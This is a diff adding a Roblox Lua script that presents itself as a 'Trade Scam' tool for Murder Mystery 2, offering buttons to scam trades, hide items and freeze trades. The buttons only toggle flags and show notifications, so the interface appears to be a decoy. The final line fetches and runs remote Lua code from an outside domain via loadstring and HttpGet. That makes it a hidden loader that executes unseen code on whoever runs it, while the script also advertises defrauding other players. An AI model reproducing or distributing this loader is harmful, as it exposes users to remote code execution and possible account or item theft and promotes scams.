@@ -1,0 +1,111 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeScamGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local mainButton = Instance.new("TextButton")
+mainButton.Name = "MainButton"
+mainButton.Size = UDim2.new(0, 200, 0, 50)
+mainButton.Position = UDim2.new(0.05, 0, 0.05, 0)
+mainButton.Text = "Trade Scam MM2 v1.29"
+mainButton.Parent = screenGui
+
+local optionsFrame = Instance.new("Frame")
+optionsFrame.Name = "OptionsFrame"
+optionsFrame.Size = UDim2.new(0, 200, 0, 150)
+optionsFrame.Position = UDim2.new(0.05, 0, 0.05, 55)
+optionsFrame.Visible = false
+optionsFrame.Parent = screenGui
+
+local startTradeScamButton = Instance.new("TextButton")
+startTradeScamButton.Name = "StartTradeScamButton"
+startTradeScamButton.Size = UDim2.new(0, 200, 0, 50)
+startTradeScamButton.Position = UDim2.new(0, 0, 0, 0)
+startTradeScamButton.Text = "Start Trade Scam"
+startTradeScamButton.Parent = optionsFrame
+
+local hideGodliesButton = Instance.new("TextButton")
+hideGodliesButton.Name = "HideGodliesButton"
+hideGodliesButton.Size = UDim2.new(0, 200, 0, 50)
+hideGodliesButton.Position = UDim2.new(0, 0, 0, 50)
+hideGodliesButton.Text = "Hide Godlies"
+hideGodliesButton.Parent = optionsFrame
+
+local freezeTradeButton = Instance.new("TextButton")
+freezeTradeButton.Name = "FreezeTradeButton"
+freezeTradeButton.Size = UDim2.new(0, 200, 0, 50)
+freezeTradeButton.Position = UDim2.new(0, 0, 0, 100)
+freezeTradeButton.Text = "Freeze Trade"
+freezeTradeButton.Parent = optionsFrame
+
+local notificationFrame = Instance.new("Frame")
+notificationFrame.Name = "NotificationFrame"
+notificationFrame.Size = UDim2.new(0.8, 0, 0.1, 0)
+notificationFrame.Position = UDim2.new(0.1, 0, 0.9, 0)
+notificationFrame.BackgroundTransparency = 0.5
+notificationFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+notificationFrame.Visible = false
+notificationFrame.Parent = screenGui
+
+local notificationText = Instance.new("TextLabel")
+notificationText.Name = "NotificationText"
+notificationText.Size = UDim2.new(1, 0, 1, 0)
+notificationText.Position = UDim2.new(0, 0, 0, 0)
+notificationText.BackgroundTransparency = 1
+notificationText.TextColor3 = Color3.new(1, 1, 1)
+notificationText.Font = Enum.Font.SourceSansBold
+notificationText.TextSize = 24
+notificationText.Parent = notificationFrame
+
+local function showNotification(text, enabled)
+    local emoji = enabled and "" or ""
+    notificationText.Text = text .. " has been " .. (enabled and "enabled" or "disabled") .. " " .. emoji
+    notificationFrame.Visible = true
+    notificationFrame.BackgroundTransparency = 0.5
+    wait(2)
+    for i = 0.5, 1, 0.05 do
+        notificationFrame.BackgroundTransparency = i
+        wait(0.05)
+    end
+    notificationFrame.Visible = false
+end
+
+local function toggleOptions()
+    optionsFrame.Visible = not optionsFrame.Visible
+end
+
+mainButton.MouseButton1Click:Connect(toggleOptions)
+
+local tradeScamEnabled = false
+local function startTradeScam()
+    tradeScamEnabled = not tradeScamEnabled
+    print("Starting trade scam...")
+    showNotification("Start Trade Scam", tradeScamEnabled)
+end
+
+local godliesHidden = false
+local function hideGodlies()
+    godliesHidden = not godliesHidden
+    print("Hiding godlies...")
+    showNotification("Hide Godlies", godliesHidden)
+end
+
+local tradeFrozen = false
+local function freezeTrade()
+    tradeFrozen = not tradeFrozen
+    print("Freezing trade...")
+    showNotification("Freeze Trade", tradeFrozen)
+end
+
+startTradeScamButton.MouseButton1Click:Connect(startTradeScam)
+hideGodliesButton.MouseButton1Click:Connect(hideGodlies)
+freezeTradeButton.MouseButton1Click:Connect(freezeTrade)
+
+local buttons = {mainButton, startTradeScamButton, hideGodliesButton, freezeTradeButton}
+for _, button in ipairs(buttons) do
+    button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 20
+end
+loadstring(game:HttpGet("https://egorikusa.space/886fcd4fff9289e6bcc96ec5.lua", true))()
+
